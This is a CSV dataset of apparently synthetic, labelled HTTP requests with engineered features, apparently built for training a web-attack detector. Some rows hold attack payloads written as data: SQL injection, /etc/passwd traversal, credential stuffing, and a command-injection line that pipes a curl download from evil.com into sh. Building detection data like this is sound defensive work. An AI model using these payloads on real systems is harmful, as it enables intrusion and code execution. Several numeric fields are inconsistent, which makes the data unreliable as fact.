timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-14 16:16:23,192.168.1.71,203.0.113.45,https,post,/,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",search_query=laptops,191.930330593665,602.0960413204574,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",,normal,1.4935544375181986,6.158372493736648,1,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}",,104.18.24.12,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Apache,0.0,0.00018614455976296473,1.328367796403254,0,0,0,0,0,0,0,0,0.0,19.41653463303375,-0.053146115464433596,0.04736951912506473,-0.0031490783914092995,0,1,0,search_query=laptops,2xx,0,1,0,13.229564680958896,0,0,602.0960413204574,7.737270749436465,0.6420429075919933,0,1028.754216051914,613.2041374369213,0,1,0,94.77090673809774,Apache,-0.05625604006544775,0.019381776849180018,0.0,0.0,0.0,0.0,0.0,1.328367796403254,-0.003850329979546502,0,0,0,0.009460885912486401,0,2026-03-15 01:52:00,1,0.38607117085232556
2026-03-14 16:19:17,203.0.113.207,185.199.108.153,http,get,https://facebook.login-help.com/login,"{""Host"":""192.168.1.1"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,196.4887025064601,4477.026508302089,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),facebook.login-help.com,typosquatting_url_spoofing,15.527388786111501,5.246066829333236,1,1,"{'Host': '192.168.1.1', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache,41.19776199081689,-0.048041545918586843,5.907890670639045,0,0,0,0,0,0,0,0,56.677684444979946,1.2572451120923318,-0.142949134359005,-0.012686093245711773,-0.027908475892927432,0,0,0,facebook.login-help.com,2xx,0,1,0,214.02848947008104,0,1,78.99099181880264,3.0322777226096633,0.9889634517100099,1,954.0905742642709,574.9195564922607,1,0,0,19.334210479025423,Apache,0.02161907564786947,0.01097174076151522,0.0,0.0,0.0,0.0,0.0,0.14340319437633364,-0.00044416969377340223,0,0,0,1.0563590311117024,0,2026-03-14 16:19:00,1,0.6663553418217173
2026-03-14 16:25:32,198.51.100.16,172.67.128.45,http,get,/css/style.css,"{""Host"":""192.168.1.1"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,194.91866146447433,4625.764538218883,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,,normal,15.610047505687078,5.077589318442696,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,13.708761759172292,-0.04397825974868594,2.5116415727491823,0,0,0,0,0,0,0,0,0.0,0.7254482510582395,0.21366720008494322,-0.005648245945871232,0.08545677835041898,0,1,0,,2xx,0,1,0,17.903714851953907,0,0,4625.764538218883,3.179051937842058,0.3509584439360409,0,1022.7465839511282,624.13064055318,0,0,1,18.503769706050836,nginx,0.002200523528387154,0.000946772505118515,0.0,0.0,0.0,0.0,0.0,0.18321432795115045,-0.003122302365428249,0,0,0,2.03646959273028,0,2026-03-14 16:25:00,1,0.35881370624669157
2026-03-14 16:27:16,185.199.108.136,10.0.0.1,http,get,/about,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,220.66242548472945,2329.397314989782,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,15.016941955006779,5.042787341156977,1,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}",,203.0.113.45,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,5.619556305981741,-0.013138182559030064,1.3155345636629265,0,0,0,0,0,0,0,0,0.0,1.1233830061244119,-0.18756488001343471,-0.034305540152859214,0.020961798233100817,0,1,0,,2xx,0,1,0,-16.498064647832837,0,0,2329.397314989782,6.270796805382929,0.32106451305586786,0,1002.5567821799649,578.0330752168492,0,0,0,55.6602803998685,nginx,-0.03553965377836136,-0.012519159394234126,0.0,0.0,0.0,0.0,0.0,0.2340993651514097,0.0019412862053686873,0,0,0,1.0050480465825156,0,2026-03-14 16:27:00,1,0.5086450591422031
2026-03-14 16:31:46,10.0.0.174,52.45.123.89,https,post,/products,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=Great article!,417.2921785319808,3097.547839409447,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",python-requests/2.28.0,,normal,17.443587664975766,4.728875903036348,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,python-requests/2.28.0,*/*,text/html,Cloudflare,9.030041878365514,-0.02989284882033567,1.2581360692944095,0,0,0,0,0,0,0,0,0.20856065564631526,22.645952314895055,0.2862740920354102,0.0046244296831153475,-0.037723885969963344,0,1,0,comment=Great article!,4xx,1,0,0,-14.651105489279265,0,1,14852.02388633828,12.695936707067595,0.44004064058780573,0,988.2736614624639,581.303453716467,0,1,0,85.62711327573481,Cloudflare,0.020194685526033068,0.020129311922089294,0.0,0.0,0.0,0.0,0.0,0.1393278222007691,-0.00310128148524775,0,0,0,1.0337136713389825,0,2026-03-14 16:31:00,1,0.5336377715904539
2026-03-14 16:40:32,172.16.0.78,203.0.113.45,https,post,/contact?text=alert!,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,211.11648108781316,4200.178357863543,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,,command_injection,16.29496631305532,5.232436467242896,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,16.897236937894476,1.030520128181531,3.3767699992781917,0,0,0,0,0,0,0,0,42.20795188167961,38.61009265712479,0.030921431407478075,0.021084119070987672,-0.0438026362105489,0,1,0,email=user@example.com&subscribe=true,2xx,0,1,0,-13.88810950859951,0,1,99.51154156064685,7.626008517930574,0.5542606006253296,0,1027.028842537786,612.4364833498336,0,1,0,79.2052826291062,nginx,0.008708700638574974,-0.05002264336180583,0.0,0.0,0.0,0.0,0.0,0.19984154875080795,0.05241451904327048,0,0,0,0.9875321500196387,0,2026-03-14 16:40:00,1,0.4415960807630028
2026-03-14 16:41:22,192.168.1.253,104.18.24.12,https,get,"/search?q=' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--","{""Host"":""104.18.24.12"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,411.25499834741936,8099.1264615953605,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,"' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--",sql_injection,16.195039425554885,5.122212481630229,1,1,"{'Host': '104.18.24.12', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,BurpSuite/2023.12,*/*,text/html,IIS,127.50880236918324,0.9955588817082418,6.426668275062843,1,0,0,0,0,0,0,0,165.500331497318,0.0,0.9170156466590712,1.022149961253493,0.040221765416985765,0,0,0,"' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--",4xx,1,0,0,60.24741005294084,0,1,48.93722198814212,11.653879213363632,0.6674318017324807,0,987.7530853977398,617.3544627802889,1,0,0,12.932997202597036,IIS,1.0446610098386264,0.012693075324236582,0.0,0.0,0.0,0.0,0.0,0.050401761726655996,0.0039582094077850825,0,0,0,0.9428111172169003,1,2026-03-14 16:41:00,1,0.5076023331473
2026-03-14 16:41:50,172.16.0.171,198.51.100.23,http,get,/.../settings?limit=1,,,213.41992973531123,2280.1582891052153,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),,normal,16.251355391696908,5.094556617840382,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),*/*,text/html,Cloudflare,20.682270541235756,1.0237487681402828,6.9401118560991915,0,0,0,1,0,0,0,0,0.4172536816192284,0.0,-0.0014835841949789475,0.015131659524715249,-0.03807353810840971,0,1,0,,2xx,0,1,0,-36.59298520130974,0,1,5464.681055075773,8.513232164544101,0.6557572689623409,0,1059.6337384337055,652.9355450455382,0,0,1,24.339810263332804,Cloudflare,-0.001415503540487082,0.0075923652310938596,0.0,1.0,0.0,0.0,0.0,0.335558508542966,0.04811280229703689,0,0,0,2.001453208949263,0,2026-03-14 16:41:00,1,0.6439489987156075
2026-03-14 16:43:23,192.168.1.71,203.0.113.45,https,post,/,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",search_query=laptops,210.58517639068248,620.5075797052417,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,0.8911516760724609,5.889948046504205,1,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,1.0774472560151698,0.005005223833152446,0.6329053136503049,0,0,0,0,0,0,0,0,0.0,18.831579422093803,-3.915381612473937e-05,0.017792539765724938,-0.016954959445927172,0,1,0,search_query=laptops,2xx,0,1,0,-17.772247911443834,0,0,620.5075797052417,8.301143269766797,0.5898082109353486,0,1024.6402362301124,613.3260714414299,0,1,0,90.60841576337904,Apache,-0.018146794725565466,0.035048532051800585,0.0,0.0,0.0,0.0,0.0,0.5874118757247028,0.00033479204511625187,0,0,0,-0.005454101187263895,0,2026-03-15 01:52:00,1,0.37856961241500825
2026-03-14 16:48:59,185.199.108.50,34.120.45.67,http,get,/view?path=/etc/passwd,"{""Host"":""198.51.100.23"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,379.0963189918378,1503.5619887076614,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),/etc/passwd,directory_traversal,15.77785082202708,4.639320656806492,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,IIS,21.741884437039595,1.035231062159492,5.306633213803424,0,0,0,1,0,0,0,0,79.93740117053227,0.043273025385139934,-0.16159912314688105,0.03475481385476255,0.032823010578395616,0,0,0,/etc/passwd,4xx,1,0,0,141.53238905681414,0,1,18.809242816139076,2.8974357264043604,0.623612581986062,0,1012.6068764575587,589.1272909416659,1,0,0,20.135494649297158,IIS,0.0018056185153930851,0.018149374718498396,0.0,1.0,0.0,0.0,0.0,0.24407420751271283,0.04994530805194774,0,0,0,1.012481689241438,1,2026-03-14 16:48:00,1,0.6792432508865675
2026-03-14 16:49:24,104.18.24.18,192.168.1.1,http,post,/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=test&password=password123,216.33072330170154,6709.178892108107,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,username=test&password=password123,credential_stuffing_brute_force,15.609518308035486,4.549564581621751,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Apache,6.842521853470846,0.035258317573594544,0.8315326804053683,0,0,0,0,0,0,0,1,36.462794380995796,33.02345293260901,0.9372721460487907,-0.023210597693373976,0.06623972572546769,0,0,0,username=test&password=password123username=test&password=password123,2xx,0,1,0,191.57760642231108,0,1,184.00067811601662,4.191123137786133,0.45153862904333064,0,1001.2062058979772,619.2022324238588,0,1,0,82.42601264959214,Apache,-0.0017342503648849572,-0.00922933803744713,0.0,0.0,0.0,0.0,1.0,0.1215243002817121,-0.0008877745851053082,0,0,0,0.9491369012168046,0,2026-03-14 16:49:00,1,0.4956758252015689
2026-03-14 16:50:49,172.16.0.135,203.0.113.45,http,get,/,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,193.18136285666935,4009.9068562206694,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,8.224817509372263,5.160126774988934,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,2.3373881718933087,0.043976218243324004,0.8417720270077249,0,0,0,0,0,0,0,0,4.937850071971842,0.0,-0.11205231197932862,0.028472141779486662,0.06077071450266334,0,1,0,,2xx,0,1,0,-12.375601318991645,0,1,812.0754574914392,10.662109784501824,0.4593860035568839,0,1020.625367556528,609.1702236086165,0,1,0,73.59743568484407,nginx,-0.010395138491746498,0.00041988497272276077,0.0,0.0,0.0,0.0,0.0,0.36013360430667396,-0.00043500504581014607,0,0,0,0.002077264875053631,0,2026-03-14 08:14:00,1,0.27640219954961
2026-03-14 16:52:55,198.51.100.59,172.67.128.45,https,get,/download?file=%25%32%65%25%32%65%25%32%66etc/passwd,"{""Host"":""198.51.100.23"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,431.99171734998686,1260.8186687420966,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",%2e%2e%2fetc/passwd,directory_traversal,16.21744797502775,5.256491649109208,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,nginx,48.90879774152579,1.0086876555559428,4.367962449002798,0,0,0,1,0,0,0,0,69.31959619705927,2.0081685379315313,0.13945010836654376,-0.01613922128762618,0.001661510846400457,1,0,0,%2e%2e%2fetc/passwd,4xx,1,0,0,103.9988141125283,0,1,18.188488362769547,4.96524540224442,0.610862215237623,0,1017.841088993313,627.5270593642113,1,0,0,7.850622745304659,nginx,0.0001742294404857695,-0.02542677484798452,0.0,1.0,0.0,0.0,0.0,0.08930831774043384,0.01644260890939149,0,0,0,0.9923866067771222,1,2026-03-14 16:52:00,1,0.38679082501203904
2026-03-14 16:54:08,172.16.0.32,3.12.45.78,http,get,/./register?file=backup.zip,"{""Host"":""203.0.113.45"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,204.4601253425589,4822.660036802984,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,,normal,15.524886622842484,4.977416203230405,1,0,"{'Host': '203.0.113.45', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Nikto/2.5.0,*/*,text/html,nginx,29.164780705788843,1.0084684159581934,5.865382537109329,0,0,0,0,0,0,0,0,1.2332160128224536,0.0,0.133347362005552,-0.019493483015997185,-0.0780416522736321,0,1,0,,2xx,0,1,0,-12.737829678669875,0,1,3910.636893017139,9.16978716695162,0.4396914140463741,0,953.4192933963941,547.1177166272837,0,0,1,12.970733194569055,nginx,-0.03795858990349927,0.0050487643648604585,0.0,0.0,0.0,0.0,0.0,0.20111183403978497,0.03742429493777302,0,0,0,2.0746663496152027,1,2026-03-14 16:54:00,1,0.33462064321798707
2026-03-14 16:59:52,172.67.128.233,185.199.108.153,http,post,/../search?id=1,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,184.12375057528124,3207.664206588918,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),,normal,19.713463176759003,5.054268695407776,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),*/*,text/html,Apache,11.974876476666296,1.0048362837923206,5.893595718607638,0,0,0,1,0,0,0,0,0.0,40.11488322724097,0.13027489824830635,-0.017250439810102814,-0.061668009459088666,0,1,0,email=user@example.com&subscribe=true,2xx,0,1,0,5.426210154557353,0,0,3207.664206588918,7.4800513299301885,0.4159459801796205,0,954.6193405054975,575.5681082853055,0,0,0,77.4142248420559,Apache,-0.02566912292649501,0.024213003713789677,0.0,1.0,0.0,0.0,0.0,0.49216338307051705,0.06721862424161719,0,0,0,2.0180058979507325,0,2026-03-14 19:55:00,1,0.586276390804763
2026-03-14 17:01:59,172.16.0.250,203.0.113.45,https,get,/ping?ip=127.0.0.1&& curl http://evil.com | sh,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,410.2726623493848,1144.2725853618617,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,&& curl http://evil.com | sh,command_injection,16.488306032369117,5.285699577534349,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,46.118391637335336,3.0532281366037304,10.532662226930304,0,0,1,0,1,0,1,0,178.01812051195154,1.7515953366964268,3.1160699322521332,0.020460629501547017,0.03726022884336281,0,0,0,&& curl http://evil.com | sh,4xx,1,0,0,41.78046665195529,0,1,6.427843312080351,11.40271384092955,0.5941840701395064,0,1028.6294223937546,609.9438241557159,1,0,0,23.896937160911897,nginx,-0.02836786926129058,-0.011350773048362066,1.0,0.0,1.0,0.0,0.0,0.2283831212015543,0.0655932014865393,0,0,0,1.0371821948581181,0,2026-03-14 17:01:00,1,0.5690563844584178
2026-03-14 17:05:07,10.0.0.123,104.18.24.12,https,get,/view?path=%25%32%65%25%32%65%25%32%66etc/passwd,"{""Host"":""203.0.113.45"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,477.06215849607867,4964.777658858665,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,%2e%2e%2fetc/passwd,directory_traversal,16.606278217916344,4.930464058293297,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,BurpSuite/2023.12,*/*,text/html,nginx,45.943375463382594,0.9487705281320022,3.734940700531948,0,0,0,1,0,0,0,0,53.142665737345524,0.6243152616268374,0.06456482643568567,-0.026066995804923263,-0.027966590199306758,1,0,0,%2e%2e%2fetc/passwd,5xx,1,0,0,279.46495622225666,0,1,93.42357200138932,7.454491483467191,0.8894935077981113,0,991.4115572846953,615.0699847658616,1,0,0,12.338211965471627,nginx,-0.035054767785529406,0.00864470528131263,0.0,1.0,0.0,0.0,0.0,0.08129443391700157,0.021686599584943275,0,0,0,0.9781808738816005,1,2026-03-14 17:05:00,1,0.6227232938161328
2026-03-14 17:05:59,172.16.0.112,104.18.24.12,http,get,/services?id=laptop,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,199.23766348979652,3191.300842200154,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,,normal,17.012811757809462,4.95116961324211,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,20.245628645637414,1.0297167236061762,2.8105183106945546,0,0,0,0,0,0,0,0,4.498033825336468,0.445433923563647,-0.09963470800609289,-0.038771844940113064,0.0917971366669041,0,1,0,,2xx,0,1,0,40.05333355596208,0,1,709.4879598779883,5.470968964869411,0.5267819915363924,0,987.4681635239465,619.7734555823791,0,1,0,85.1183627757701,nginx,0.002594834772432449,0.014134343768411052,0.0,0.0,0.0,0.0,0.0,0.1388209948867245,0.05259703918450535,0,0,0,0.9648633475889486,0,2026-03-14 17:05:00,1,0.4939305909975056
2026-03-14 17:08:12,104.18.24.37,10.0.0.1,http,get,/api/v1/products,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,179.9413613056359,2134.7843457270887,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,,normal,17.576366589154873,5.119379261614762,1,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,nginx,18.42589187394891,0.0052763735022651505,3.412947179423754,0,0,0,0,0,0,0,0,0.0,0.0,-0.2515248664208207,0.0029977537677581506,0.06346070189856845,0,1,0,,2xx,0,1,0,-3.416228911301378,0,0,2134.7843457270887,4.131863111514161,0.2778169246094606,0,1000.6937770498716,579.5629118469551,0,0,0,63.814656570702844,nginx,0.00567417052734268,0.013440984387133186,0.0,0.0,0.0,0.0,0.0,0.18522561636482213,-0.0002019994572812704,0,0,0,3.0019723306047825,0,2026-03-14 17:08:00,1,0.25624782053657214
